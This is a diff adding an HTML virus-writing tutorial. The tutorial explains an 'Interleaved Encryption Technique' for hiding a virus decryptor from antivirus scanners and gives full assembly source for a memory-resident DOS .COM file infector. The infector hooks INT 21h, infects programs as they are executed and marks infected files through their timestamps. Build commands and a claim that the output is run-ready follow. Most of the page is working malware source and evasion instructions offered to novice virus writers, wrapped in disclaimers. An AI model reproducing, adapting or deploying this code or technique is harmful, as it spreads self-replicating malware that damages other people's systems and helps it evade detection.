@@ -1,0 +1,555 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Interleaved Encryption Technique</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>+ VIRUS TECHNIQUES +<BR>
+</FONT>&quot;Let's talk Stealth.&quot;<BR>
+WriTTeN By SToMaCH CoNTenTS </FONT></B></P></CENTER>
+
+<P>
+<HR WIDTH="100%"><p></P>
+
+<P>Hello Kiddies.. Stomach has something tasty for you to chew on, but
+first: </P>
+
+<P><B>DISCLAIMER: </B></P>
+
+<P>I take absolutely no responsibility for the use/misuse of the information
+and/or source code in this document. By using the information/source code
+in this document YOU are agreeing to take full responsibility for any consequence
+of using this information. </P>
+
+<CENTER><P><B>IET - Interleaved Encryption Technique. </B></P></CENTER>
+
+<P>The concept is so simple, it's really not much to shout about, however,
+it's potential for dodging AV's is enormous. </P>
+
+<P>Basically the idea is not to replace XOR encryption or the like, but
+to compliment it. The purpose of IET in fact, is to protect the decryption
+code. It's a mutualistic relationship. </P>
+
+<UL>
+<P>Step (1): IET encoded decryption routine (unscannable) decrypts the
+rest of the virus code (unscannable) </P>
+
+<P>Step (2): Decrypted virus code encrypts the replicated virus with new
+unique IET code. </P>
+</UL>
+
+<P>So the IET code serves the purpose of encoding the decoding code, and
+the decoded code serves the purpose of re-IET-encoding the decryption algorithm.
+</P>
+
+<CENTER><P><B>&quot;You encode my back, I'll encode yours&quot; so too
+speak. </B></P></CENTER>
+
+<P>So what does the common AV have to go on now? NOTHING. It won't be able
+to find a single string of bytes in the IET code longer than perhaps 1
+instruction, so it's useless there, and it won't be able to find a single
+string of bytes in the encrypted portion, because the encryption key will
+always change. </P>
+
+<P>Ok, so how do we do it? Well the method simply interleaves each instruction
+with another randomly chosen instruction. Take your standard XOR decryption
+code.. </P>
+
+<UL>
+<PRE>      mov     si, offset EncryptedCode
+      mov     bx, Key
+      mov     cx, BytesToEncrypt
+Decrypt:
+      xor     [si],bx
+      inc     si
+      inc     si
+      loop    Decrypt
+EncryptedCode:
+      ...                      ; Safe from here on..
+      ...
+      ...
+</PRE>
+</UL>
+
+<P>Now, create a list of instructions which do nothing, or use registers
+not used in the decryption code, and their lengths. </P>
+
+<UL>
+<PRE>InstructionList:
+...  db     3           ; length of instruction..
+      add    ax,0        ; instruction..
+      db     1
+      inc    ax
+      db     1
+      cld
+      db     1
+      std
+      db     3
+      adc    ax,0
+      db     2
+      or     al,al
+      db     2
+      or     ah,ah
+      db     2
+      or     si,si
+</PRE>
+</UL>
+
+<P>Also insert a copy of the decryption code, also with instruction lengths
+interleaved in the code.. </P>
+
+<UL>
+<PRE> DecryptionCodeTemplate:
+      db      3
+      mov     si, offset EncryptedCode
+      db      5
+      mov     bx, cs:Key
+      db      3
+      mov     cx, BytesToEncrypt
+Decrypt:
+      db      2
+      xor     [si],bx
+      db      1
+      inc     si
+      db      1
+      inc     si
+      db      2
+      loop    Decrypt
+ EncryptedCode:
+</PRE>
+</UL>
+
+<P>Now it's simply a bit of coding to scan through the DecryptionCodeTemplate,
+copy 1 instruction to the new IET code block, then selected a random instruction
+from the InstructionList and inserting it, then fetching another instruction
+from the DecryptionCodeTemplate and then fetching another one from the
+the InstructionList.. and so on and so on. </P>
+
+<P>Once the code is &quot;rendered&quot; you will have something that may
+look like: </P>
+
+<UL>
+<PRE>      or      al, al
+      mov     si, offset EncryptedCode
+      adc     ax, 0
+      mov     bx, cs:Key
+      or      si, si
+      mov     cx, BytesToEncrypt
+Decrypt:
+      or      si, si
+      xor   [si], bx
+      inc     ax
+      inc     si
+      cld
+      inc     si
+      add     ax, 0
+      loop    Decrypt
+ EncryptedCode:
+</PRE>
+</UL>
+
+<P>As you can see, this is just 1 of 2,097,152 variations (7 insertion
+points, 8 different instructions). You could even write code which dumps
+a random number of instructions at each insertion point. It might be a
+good idea to make the decryption algorithm a little more complicated as
+well. </P>
+
+<P>Remember that the InstructionList and the DecryptionCodeTemplate is
+safely tucked away in the encrypted portion of the virus, which means there
+is nothing an AV can get it's hands on. </P>
+
+<CENTER><P><B>THE PROBLEM WITH IET </B></P></CENTER>
+
+<P>Ok, by now you might have noticed a slight snag in the concept. The
+relative jump or LOOP should I say at the end, and the reference to the
+EncryptedCode label. Due to the undetermined size of the decryption code,
+the LOOP will be out, and so will the EncryptedCode label, but that hardly
+poses a problem. A wee bit of self editing code will sort that out, and
+is definitely not going to vex a hardened virus coder. </P>
+
+<CENTER><P><B>TECHNIQUES - GETTING A WEE BIT MORE DEVIOUS </B></P></CENTER>
+
+<P>Ok, so you've written your first IET-utilizing virus, now what? Well
+to make things a little more interesting, and a lot more aggrevating to
+the general AV croud, you might want to try one of the following: </P>
+
+<P>+ Use polymorphic code in the form of DecryptionTemplateCode. Have a
+variety of different decryption/encryption algorithms. Screw XOR. Let's
+get original people!!! </P>
+
+<P>+ Write a Single Step handler which actually executes code in the interleaved
+form. ie. with instruction lengths still embedded. This will provide some
+protection for your code, as trying to trace will crash it. You can also
+leave the memory image encrypted, and actually execute the encrypted code.
+</P>
+
+<CENTER><P><B>OK, SO YOU WAN'T SOME SOURCE CODE </B></P></CENTER>
+
+<P>This is a wee .COM file infector that I whipped together to test IET.
+It works. I have modified it from a bigger version to make things easier
+to understand for you learners out there. If you see funny things like
+&quot;Padding end of file&quot;, just bare with me.. ignore it. </P>
+
+<P>There is no payload, as I don't believe in malicious virii. There's
+no challenge in being destructive. Anyway.. here we go.. </P>
+
+<UL>
+<PRE>----------------CUT HERE------------------------------------
+
+VirusCode     SEGMENT  PARA  'CODE'
+              ASSUME   CS:VirusCode, DS:VirusCode
+
+              ORG      100h
+
+              .286
+
+InstructionListSize           =  8
+SizeOfVirus                   = OFFSET EOV - OFFSET VirusStart
+SizeOfVirusInPara             = (SizeOfVirus / 16) + 1
+WordsToDecrypt                =  ( SizeOfVirus / 2) + 1
+DecryptionCodeTemplateLength  =  10 ; instructions
+PreferedSize                  =  3200
+
+; IET code will be written here, protecting the code ahead. Everything beyond
+; this point is XOR encrypted, ie. Safe.
+
+VirusStart:
+              call    GetIP
+GetIP:
+              pop     si
+              sub     si, 3
+              mov     bp, cs
+              mov     ax, bp
+              dec     ax
+              mov     ds, ax
+              mov     bx, ds:[3]                ; BX = Para's of 'Z' block
+              sub     bx, SizeOfVirusInPara * 2
+              mov     dx, bx                   ; DX = modification to 'Z'
+block
+              dec     dx
+              push    ax
+              mov     ax,02e2eh
+              int     21h ; installation check. ax=0 if already installed
+              or      ax,ax
+              pop     ax
+              jz      DontTSR
+              mov     ds:[3],dx
+DontTSR:
+              add     bx, ax
+              inc     bx
+              mov     es, bx
+              xor     di, di
+              push    cs
+              pop     ds
+              mov     cx, OFFSET EoV - OFFSET VirusStart
+              rep     movsb  ; copy virus to high memory..
+              sub     bx, 10h
+              push    bx
+              push    OFFSET EntryHigh
+              retf
+
+EntryHigh:
+              push    ds
+              mov     ax,word ptr cs:OldBytes
+              mov     ds:[0100h],ax
+              mov     al,byte ptr cs:OldBytes[2]
+              mov     ds:[0102h],al
+              xor     ax,ax
+              mov     ds,ax
+              mov     ax,02e2eh
+              int     21h
+              or      ax,ax
+              jz      NoHook
+              mov     ax,ds:[21h*4]
+              mov     word ptr cs:Old21,ax
+              mov     ds:[21h*4],offset Hook21
+              mov     ax,ds:[21h*4+2]
+              mov     word ptr cs:Old21[2],ax
+              mov     ds:[21h*4+2],cs
+NoHook:
+              pop     ax
+              mov     ds,ax
+              mov     es,ax
+              push    ax
+              mov     ax,0100h
+              push    ax
+              retf
+
+OldBytes      db      0CDh, 020h, 00h
+NewBytes      db      0E9h, 0, 0
+Old21         dd      ?
+FAttr         dw      ?
+FDateTime     dw      ?
+              dw      ?
+PrefSize      dw      ?
+
+int21         macro
+              int     21h
+              endm
+
+Hook21:
+              cmp     ax,02e2eh
+              jne     Poop
+              xor     ax,ax
+              iret
+Poop:
+              cmp     ax, 4b00h
+              je      InfectTime
+Bail:
+              jmp     dword ptr cs:Old21
+
+InfectTime:
+              push    ds
+              push    es
+              pusha
+              mov     ax,4300h
+              int21 ; Get file attributes
+              mov     cs:FAttr,cx
+              mov     ax,4301h
+              xor     cx,cx
+              int21 ; Set file attributes
+              mov     ax,3d02h
+              int21 ; Open executable..
+              mov     bx,ax ; bx=file handle
+              mov     ax,4301h
+              mov     cx,cs:FAttr
+              int21 ; Reset file attributes
+              push    cs
+              pop     ds
+              mov     ax,5700h
+              int21 ; Get file date &amp; time
+              mov     FDateTime,cx
+              mov     FDateTime[2],dx
+              mov     al,cl
+              and     al,1fh
+              cmp     al,3 ; seconds=6, file already infected.
+              je      AlreadyInfected
+              mov     ah,3fh
+              mov     dx,offset OldBytes
+              mov     cx,3  ; read first 3 bytes..
+              int21
+              cmp     word ptr OldBytes, &quot;ZM&quot;
+              je      AlreadyInfected    ; Not really, just doesn't do .exe's
+              mov     ax,4202h
+              cwd                ; dx=0
+              xor     cx,cx      ; cx=0
+              int21
+              sub     ax,3
+              mov     word ptr NewBytes[1],ax
+              call    RenderIETCode
+              mov     ah,40h
+              mov     cx,di
+              mov     dx,offset IETBuffer
+              sub     cx,dx
+              push    cx ; save size of IET code
+              int21 ; Write IET code
+              mov     ah,40h
+              mov     cx,SizeOfVirus
+              mov     dx,Offset EOV
+              int21 ; Write virus..
+              mov     cx,PreferedSize
+              pop     ax ; ax=size of IET code
+              sub     cx,ax
+              sub     cx,SizeOfVirus
+              mov     ah,40h
+              mov     dx,Offset EOV
+              int21 ; Pad end of virus to keep constant size
+              xor     cx,cx
+              xor     dx,dx
+              mov     ax,4200h
+              int21 ; Seek to BOF.
+              mov     ah,40h
+              mov     cx,3
+              mov     dx,offset NewBytes
+              int21 ; Write new jump code.
+              and     FDateTime,0ffe0h
+              or      FDateTime,3 ; seconds=6 -&gt; infected file
+AlreadyInfected:
+              mov     ax,5701h
+              mov     cx,FDateTime
+              mov     dx,FDateTime[2]
+              int21 ; Reset file date/time
+              mov     ah,3eh
+              int21 ; Close file.
+              popa
+              pop     es
+              pop     ds
+              jmp     Bail
+
+IETBuffer     db      60 dup (0)
+
+RenderIETCode:
+; OUT:   di -&gt; end of code in IETBuffer
+
+              cld
+              push    ds
+              push    es
+              push    bx
+              push    cs
+              xor     ax, ax
+              mov     ds, ax
+              mov     bp, ds:[046ch] ; bp = random#
+              pop     si
+              mov     es,si
+              mov     ds,si
+              mov     di, OFFSET EOV
+              mov     si, 0100h
+              mov     cx, WordsToDecrypt
+EncryptLoop:
+              lodsw
+              xor     ax,bp
+              stosw
+              loop    EncryptLoop
+              mov     word ptr ds:[OFFSET DCT_Key - 2],bp
+
+              mov     di, OFFSET IETBuffer
+              mov     si, OFFSET DecryptionCodeTemplate
+              mov     dx, DecryptionCodeTemplateLength
+              xor     ch, ch
+              xor     ah, ah
+
+RenderNextInstruction:
+              mov     bx, OFFSET InstructionList
+              mov     cx, bp
+              rol     bp, 1
+              xor     bp, 1234h
+              and     cx, 7      ; mods to 0-7
+              jz      Code0
+Grabnext:
+              mov     al, [bx]   ; al=instruction length
+              inc     bx
+              add     bx, ax
+              loop    GrabNext
+Code0:
+              mov     cl, [bx]
+              inc     bx
+              push    si
+              mov     si, bx
+              rep     movsb
+              pop     si
+
+              cmp     dx, 9
+              jne     CheckMark7
+              mov     Mark9, di
+CheckMark7:
+              cmp     dx, 7
+              jne     CheckMark4
+              mov     Mark7, di
+CheckMark4:
+              cmp     dx, 4
+              jne     DontMark
+              mov     Mark4, di
+DontMark:
+              lodsb             ; get instruction length..
+              mov     cl, al
+              rep     movsb     ; copy instruction (DCT)
+
+              dec     dx
+              jnz     RenderNextInstruction
+
+              mov     ax, Mark4
+              sub     ax, di
+              mov     es: [di - 1],ax     ; edit loop
+              mov     bx, di
+              sub     bx, Mark9
+              mov     si, Mark7
+              inc     si
+              inc     si
+              sub     bx, 3
+              mov     es:[si], bx     ; edit offset
+              pop     bx
+              pop     es
+              pop     ds
+              ret
+
+DecryptionCodeTemplate:
+              db      1
+              cld                            ; 10
+              db      3
+              call    $+3                    ; 9
+              db      1
+              pop     si                     ; 8
+              db      4
+              add     si, 1234h              ; 7
+              db      3
+              mov     bx, 0000h              ; 6
+DCT_Key:
+              db      3
+              mov     cx, WordsToDecrypt     ; 5
+DecryptT:
+              db      2
+              xor     [si], bx               ; 4
+              db      1
+              inc     si                     ; 3
+              db      1
+              inc     si                     ; 2
+              db      2
+              loop    DecryptT               ; 1
+
+InstructionList:
+              db      3           ; length of instruction..
+              add     ax,0        ; instruction..
+              db      1
+              inc     ax
+              db      1
+              cld
+              db      3
+              and     ax,07fffh
+              db      3
+              adc     ax,0
+              db      2
+              or      al,al
+              db      2
+              or      ah,ah
+              db      2
+              or      si,si
+
+Key           dw      0000h
+Mark9         dw      ?
+Mark7         dw      ?
+Mark4         dw      ?
+
+EOV:
+
+VirusCode  ENDS
+           END VirusStart
+
+----------------CUT HERE--------------------------------------
+</PRE>
+</UL>
+
+<P>Ok.. I assembled this with: </P>
+
+<PRE>    TASM IETV.ASM
+    TLINK -T IETV
+</PRE>
+
+<P>The .COM created need not be modified to run. It's run-ready. All you
+have to do is infect a file with it, reset your PC, go in with a debugger
+and take a look at the code it creates. </P>
+
+<CENTER><P><B>ANOTHER DISCLAIMER: </B></P></CENTER>
+
+<P>Assemble this code at your own risk. I won't be held liable for any
+damage caused to your or any other PC or constituents thereof. </P>
+
+<P>I would recommend only assembling this and executing it if you feel
+experienced enough to control the situation. </P>
+
+<CENTER><P><B>CHEERIO FELLOW CODERS </B></P></CENTER>
+
+<P>Well that's it for now, I'm hungry! Hope this inspires you to incorporate
+IET into your own NON-MALICIOUS FRIENDLY creations. Anyone got any other
+kuhl ideas? </P>
+
+<P>&lt;burp!&gt;</P>
+
+<P>(Where'd The Analyst Go?) </P>
+
+<P>
+<HR WIDTH="100%"><p></P>
+
+</BODY>
+</HTML>
